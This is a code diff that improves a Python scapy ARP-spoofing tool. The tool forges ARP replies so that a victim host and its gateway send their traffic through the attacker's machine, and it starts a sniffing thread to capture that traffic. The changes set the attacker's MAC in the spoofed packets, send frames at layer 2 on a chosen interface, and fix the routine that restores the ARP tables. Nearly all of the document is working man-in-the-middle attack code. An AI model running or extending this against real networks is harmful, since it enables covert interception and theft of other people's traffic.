@@ -1,5 +1,5 @@
 from multiprocessing import Process
-from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sendp, sniff, sndrcv, srp, wrpcap)
 import os
 import sys
 import time
@@ -16,8 +16,14 @@ class Arper:
     def __init__(self, victim, gateway, interface='eth0'): ## Change your interface by need i.e for Mac en0
         self.victim = victim
         self.victimmac = get_mac(victim)
+        if not self.victimmac:
+            print(f"ERROR Could not get MAC address for victim: {victim}")
+            sys.exit(1)
         self.gateway = gateway
         self.gatewaymac = get_mac(gateway)
+        if not self.gatewaymac:
+            print(f"[ERROR] Could not get MAC address for gateway: {gateway}")
+            sys.exit(1)
         self.interface = interface
         self.iface = interface
         conf.verb = 0
@@ -36,22 +42,27 @@ class Arper:
         self.sniff_thread.start()
 
     def poison(self):
-        poison_victim = ARP()
-        poison_victim.op = 2
-        poison_victim.psrc = self.gateway
-        poison_victim.pdst = self.victim
-        poison_victim.hwdst = self.victimmac
+        attacker_mac = get_if_hwaddr(self.interface)
+        poison_victim = ARP(
+            op = 2,
+            psrc = self.gateway,
+            pdst = self.victim,
+            hwdst = self.victimmac,
+            hwsrc = attacker_mac
+        )
         print(f'IP src: {poison_victim.psrc}')
         print(f'IP dst: {poison_victim.pdst}')
         print(f'MAC dst: {poison_victim.hwdst}')
         print(f'MAC src: {poison_victim.hwsrc}')
         print(poison_victim.summary())
         print("="*30)
-        poison_gateway = ARP()
-        poison_gateway.op = 2
-        poison_gateway.psrc = self.victim
-        poison_gateway.pdst = self.gateway
-        poison_gateway.hwdst = self.gatewaymac
+        poison_gateway = ARP(
+            op=2,
+            psrc=self.victim,  # Pretend to be the victim
+            pdst=self.gateway,  # Target gateway
+            hwdst=self.gatewaymac,  # Gateway's real MAC
+            hwsrc=attacker_mac  # Attacker's MAC
+        )
 
         print(f'IP src: {poison_gateway.psrc}')
         print(f'IP dst: {poison_gateway.pdst}')
@@ -64,8 +75,8 @@ class Arper:
             sys.stdout.write(".")
             sys.stdout.flush()
             try:
-                send(poison_victim)
-                send(poison_gateway)
+                sendp(poison_victim, iface=self.interface, verbose=False)
+                sendp(poison_gateway, iface=self.interface, verbose=False)
             except KeyboardInterrupt:
                 self.restore()
                 sys.exit()
@@ -86,19 +97,27 @@ class Arper:
         
     def restore(self):
         print ('Restoring ARP tables....')
-        send(ARP(
+        
+        attacker_mac = get_if_hwaddr(self.interface)
+
+        restore_victim = Ether(dst=self.victimmac) / ARP(
             op=2,
             psrc=self.gateway,
             hwsrc=self.gatewaymac,
             pdst=self.victim,
-            hwdst='ff:ff:ff:ff:ff:ff'), count=5)
-        send(ARP(
+            hwdst=self.victimmac
+        )
+
+        restore_gateway = Ether(dst=self.gatewaymac) / ARP(
             op=2,
             psrc=self.victim,
             hwsrc=self.victimmac,
             pdst=self.gateway,
-            hwdst='ff:ff:ff:ff:ff:ff'),
-            count=5)
+            hwdst=self.gatewaymac
+        )
+        
+        sendp(restore_victim, iface=self.interface, count=5, verbose=False)
+        sendp(restore_gateway, iface=self.interface, count=5, verbose=False)
 
 if __name__ == '__main__':
     try:
